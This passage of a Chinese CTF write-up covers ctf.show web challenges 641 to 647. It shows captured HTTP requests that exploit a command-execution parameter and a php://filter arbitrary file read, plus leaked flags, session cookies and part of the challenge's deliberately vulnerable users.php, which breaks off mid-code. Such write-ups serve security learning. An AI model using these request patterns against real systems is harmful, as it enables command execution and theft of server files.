</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: none
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>这样子拿到了642的flag，不是哥们我到处找啊这东西有意思</p><h1 id=web641>web641</h1><p>既然刚才抓包得到了642，那么回去找找641的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: none
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><h1 id=web643>web643</h1><p>发现那个网页可以执行命令那么试试，只有三个命令，而且ping还不可以使用，继续看抓包能不能强行修改</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /system36d/users.php?action=netTest&amp;cmd=ls HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: application/json, text/javascript, */*; q=0.01
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
</span></span><span class=line><span class=cl>Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=1, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>找到<code>secret.txt</code>，访问之后拿去解码就是web643的flag</p><h1 id=web645>web645</h1><p>数据备份里面有<code>645flag</code></p><h1 id=web646>web646</h1><p>在远程更新里面，进行任意文件读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dinit.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: application/json, text/javascript, */*; q=0.01
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
</span></span><span class=line><span class=cl>Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=1, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DB_PATH&#39;</span><span class=p>,</span> <span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/db/data_you_never_know.db&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;FLAG645&#39;</span><span class=p>,</span><span class=s1>&#39;flag645=ctfshow{28b00f799c2e059bafaa1d6bda138d89}&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;FLAG646&#39;</span><span class=p>,</span><span class=s1>&#39;flag646=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//存在漏洞，未修补前注释掉
</span></span></span><span class=line><span class=cl><span class=c1>//include &#39;util/common.php&#39;;
</span></span></span></code></pre></td></tr></table></div></div><h1 id=web647>web647</h1><p>那么我们读取文件一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>- checklogin.php
</span></span><span class=line><span class=cl>- db
</span></span><span class=line><span class=cl>- index.php
</span></span><span class=line><span class=cl>- init.php
</span></span><span class=line><span class=cl>- login.php
</span></span><span class=line><span class=cl>- logout.php
</span></span><span class=line><span class=cl>- main.php
</span></span><span class=line><span class=cl>- secret.txt
</span></span><span class=line><span class=cl>- static
</span></span><span class=line><span class=cl>- update.php
</span></span><span class=line><span class=cl>- update2.php
</span></span><span class=line><span class=cl>- users.php
</span></span><span class=line><span class=cl>- util
</span></span></code></pre></td></tr></table></div></div><p>users.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm># -*- coding: utf-8 -*-
</span></span></span><span class=line><span class=cl><span class=cm># @Author: h1xa
</span></span></span><span class=line><span class=cl><span class=cm># @Date:   2021-07-26 10:25:59
</span></span></span><span class=line><span class=cl><span class=cm># @Last Modified by:   h1xa
</span></span></span><span class=line><span class=cl><span class=cm># @Last Modified time: 2021-08-01 01:52:58
</span></span></span><span class=line><span class=cl><span class=cm># @email: h1xa@ctfer.com
</span></span></span><span class=line><span class=cl><span class=cm># @link: https://ctfer.com
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;init.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nx>DB_PATH</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ret</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>switch</span> <span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;list&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>getUsers</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>]),</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;limit&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;add&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>addUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>],</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;del&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>delUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;update&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>updateUser</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>],</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;backup&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>backupUsers</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;upload&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>recoveryUsers</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;phpInfo&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>phpInfoTest</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;netTest&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>netTest</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;remoteUpdate&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>remoteUpdate</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;auth&#39;</span><span class=p>],</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;update_address&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;authKeyValidate&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>authKeyValidate</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;auth&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;evilString&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>evilString</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;evilNumber&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>evilNumber</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>],</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;evilFunction&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>evilFunction</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>],</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;evilArray&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>evilArray</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>],</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s1>&#39;evilClass&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>evilClass</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>],</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>		<span class=nv>$ret</span> <span class=o>=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;数据获取失败&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=p>));</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
